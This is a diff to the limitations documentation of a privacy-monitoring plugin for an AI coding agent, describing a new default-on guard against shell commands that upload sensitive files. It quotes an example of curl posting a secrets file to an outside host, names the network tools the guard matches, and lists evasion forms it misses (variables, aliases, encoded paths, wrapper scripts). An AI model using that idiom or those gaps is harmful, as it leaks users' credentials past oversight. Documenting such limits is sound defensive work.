@@ -38,9 +38,17 @@ UserPromptSubmit credential holds now have a separate resubmission confirmation 
 
 ## 6. A command that reads a file itself is not inspected.
 
-The engine scans the *text of a tool call*, not what that call will read at runtime. So `curl https://example.com --data @secrets.env` is allowed: the destination is correctly identified as external, but the command's text contains a **path**, not the file's contents, and the contents are read by `curl` after the hook has already decided. Put the same secret literally in the command and it is caught. If the agent reads the file through a tool first, that content passes `PostToolUse` and does land in the ledger — the gap is specifically a command that dereferences a path on its own and sends the result.
+The engine does not inspect file contents referenced by a command. In 0.9.1, a default-on lexical network guard denies an observed shell command when a recognized network-program token and a known-sensitive-path fragment occur together. It reuses the existing path rules and template suffix exemptions. It does not open files or rewrite uploads.
 
-This is a property of event-sourcing from hook boundaries, not a bug with a fix pending. Closing it would mean resolving file references in commands and reading those files ourselves, which would make this tool start opening your files — a larger privacy surface than the one it is reporting on. Note this is *not* the adversarial case in the next item: `--data @file` is an ordinary idiom, not an evasion.
+This covers visible sensitive paths in curl command substitutions, backticks, process substitutions, `@file` arguments, `--data-urlencode name@file`, form uploads, `-T`/`--upload-file`, stdin redirection and pipelines. It also covers visible sensitive paths accompanying the other recognized network programs, including wget, scp and rsync.
+
+The check does not trace payload data flow. A sensitive-path reference in a literal argument, header, URL or unrelated part of the same compound command can also cause denial. Ordinary non-sensitive uploads such as `curl -F file=@report.txt https://example.com` remain eligible for the existing policy checks. A recognized network program remains conservatively classified as external even when an argument names 127.0.0.1; the guard does not establish effective routing or configuration.
+
+Tokenization failure with a recognizable network-program token causes denial, even when no sensitive path can be recovered. A missing sensitive-path match is not itself a parser failure. Variables, aliases, configuration files, generated or encoded paths, symlinks, wrapper scripts and nested shell programs passed as one quoted argument are not resolved. A file such as `secrets.env` remains outside the existing `.env` rule unless another rule matches it; undiscovered secrets inside otherwise ordinary files remain outside this guard.
+
+The network guard is on by default and independent of the optional local read guard. Mask rules and internal consent tokens do not bypass it. A returned denial does not confirm host enforcement.
+
+Legacy accounting records matched rule markers as `prevented` with zero additional charge; repeated markers may merge. Version-2 accounting records a denial observation and one unresolved file-reference subject per matched rule, without a path, suffix, exemplar or identity hash. These subjects do not identify or count files. A parse-failure denial without a recovered path or detector finding has no fabricated finding event; legacy accounting has no row for that case, while version 2 still records the denial observation. Neither accounting mode establishes that the host stopped execution.
 
 ## 7. Detection is heuristic.
 
@@ -75,6 +83,8 @@ Collapsing two sightings into one ledger row needs more than a hash collision �
 
 ## 11. Origin extraction is best-effort.
 
+The network guard is separate from origin extraction and does not turn a lexical path reference into an origin or accounting file identity. Its broader co-occurrence rule and limitations are described in limit 6.
+
 `cat .env` is recognised; `python -c "open('.env')"` is not. A path under your own home directory is recorded as `~/…`: the account name is kept out of the ledger, the same way `runtime.display_path` keeps it out of a report and a masked exemplar reads `/Users/•••/app.log`. Another account's home is left as it is — that is a row you want to be able to read. A row with no origin offers no rule, rather than offering one that would not work.
 
 Within the commands it does read, it errs the same way: a candidate that is not shaped like a path (`cat Makefile`, or a file named by an option the extractor does not know) is recorded as the command, not as a file. The cost of guessing wrong runs the other way — `events.source` is persisted, served and rendered, so an option value taken for a filename would put an argument, possibly a credential, into the ledger (I1).
@@ -93,9 +103,11 @@ What limits every rule is the session. `Ledger.add_policy` scopes it to `session
 
 ## 14. Only a shell command whose read the extractor recognises is stopped.
 
+This limit describes the optional local read guard. Network commands are also subject to the independent default-on guard in limit 6.
+
 **The guard covers one tool: the shell.** A read reaches the guard only as a `Bash` tool call, because that is how Codex reads a file — it has no native file-read tool, so the model shells out to `cat` or `sed -n`. Any other tool is allowed unexamined, including one a plugin adds that takes a file path and reads it. The plugin does not enumerate the tools Codex can send, and a path in an unknown tool's arguments is as likely to be written as read, so blocking on one would risk refusing a write under a message that says "blocked a read".
 
-Within the shell, the guard acts on the path `origin.extract_origin` reads out of the command text — limit 11 holds that mechanism and its "never guess" rule. A command it does not resolve to a path is allowed: no deny, no notice, no ledger row. This is limit 6's root cause seen from the other side; the engine reads the text of a tool call, not what the call will do.
+Within the shell, the guard acts on the path `origin.extract_origin` reads out of the command text — limit 11 holds that mechanism and its "never guess" rule. A command it does not resolve to a path is allowed: no deny, no notice, no ledger row. The engine reads command text, not execution; the separate network guard can deny visible sensitive-path references without resolving the read's origin.
 
 Ordinary shell forms that are not stopped, in three groups:
 
@@ -107,11 +119,13 @@ And within the paths it does resolve: the pattern behind `.env` requires a start
 
 ## 15. A template file is never blocked.
 
-`.env.example` is committed to be read, and blocking it stops ordinary work while the user's only escape is turning the guard off — so the guard carves it out, even one that really holds a key. Detection still flags it, so such a file still shows up in the audit.
+The carve-out applies to path-based denial only. Both the optional local read guard and the default-on network guard reuse `is_sensitive_path`, which exempts paths ending in `.example`, `.sample`, `.template` or `.dist`. Detection still flags matching path text. A literal credential elsewhere in a template-upload command can independently cause denial; the plugin does not inspect the template file's contents.
 
 ## 16. Nothing is blocked until you turn it on.
 
 This historical heading concerns the optional shell-read guard. That guard is off by default; $privacy read status reports its setting. Credential prompt holds are separate and do not depend on this setting.
+
+The network guard is on by default and does not depend on that setting. Existing credential-based egress policy and failure handling also operate without enabling the local read guard. These are denial decisions returned by the plugin, not confirmation of host enforcement.
 
 ## 17. A blocked read can leave a record that says the opposite, in one sequence.
 
@@ -122,6 +136,8 @@ New-accounting sessions append independent observations and finding outcomes. An
 A denial issued by Privacy HUD is not confirmation that the host enforced it. Current hooks leave that outcome unresolved.
 
 ## 18. A blocked read's row does not name the file.
+
+Network-file denials also keep shell-derived file identities unresolved. Their version-2 file-reference subjects use source `tool input`, an allowlisted path-rule ID and an opaque label, with no filename, suffix, exemplar or identity hash. One subject represents one matched rule within an observation, not one identified file. Network parse failures without a recovered path create no file subject.
 
 Legacy-accounted sessions and historical rows can still merge files matching one detector pattern. Version-2 accounting removes that pattern-based merging, but the audit still cannot identify which file a shell-read denial concerned.
 
